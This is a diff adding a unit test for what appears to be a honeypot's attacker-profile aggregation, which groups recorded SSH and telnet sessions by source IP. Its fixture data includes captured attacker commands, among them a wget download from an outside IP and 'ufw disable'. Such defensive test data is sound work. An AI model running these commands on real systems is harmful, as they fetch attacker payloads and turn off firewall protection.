@@ -306,6 +306,29 @@ class Store(unittest.TestCase):
         self.assertEqual(first["clients"][0]["name"], "SSH-2.0-Go")
         self.assertEqual(first["latest_session"], "h2")
 
+    def test_attacker_profiles_aggregate_source_activity_and_filter_window(self):
+        self.h.add_session(self.session(session="profile-a", ip="198.51.100.7", port=22,
+            logins=[{"u": "root", "p": "x", "ok": True}, {"u": "admin", "p": "y", "ok": False}],
+            commands=["uname -a", "wget http://203.0.113.50/a"], files=[]))
+        self.h.add_session(self.session(session="profile-b", ip="198.51.100.7", proto="telnet", port=23,
+            logins=[{"u": "root", "p": "z", "ok": False}], commands=["ufw disable"],
+            files=[{"sha256": "a" * 64}]))
+        self.h.add_session(self.session(session="profile-c", ip="198.51.100.8",
+            logins=[], commands=["whoami"], files=[]))
+        result = self.h.attacker_profiles(24)
+        self.assertEqual(result["total"], 2)
+        profile = next(x for x in result["profiles"] if x["ip"] == "198.51.100.7")
+        self.assertEqual(profile["sessions"], 2)
+        self.assertEqual(profile["login_attempts"], 3)
+        self.assertEqual(profile["successful_logins"], 1)
+        self.assertEqual(profile["commands"], 3)
+        self.assertEqual(profile["files"], 1)
+        self.assertEqual({x["name"] for x in profile["services"]}, {"SSH:22", "TELNET:23"})
+        self.assertIn("root", [x["name"] for x in profile["usernames"]])
+        self.assertEqual(profile["sample_hashes"], ["a" * 64])
+        self.assertEqual(profile["latest_session"], "profile-b")
+        self.assertIn("do not identify a person", result["note"])
+
     def test_campaigns_correlate_shared_fingerprints_and_samples(self):
         hassh = "16443846184eafde36765c9bab2f4397"
         self.h.add_session(self.session(session="campaign-a", ip="198.51.100.7", hassh=hassh))
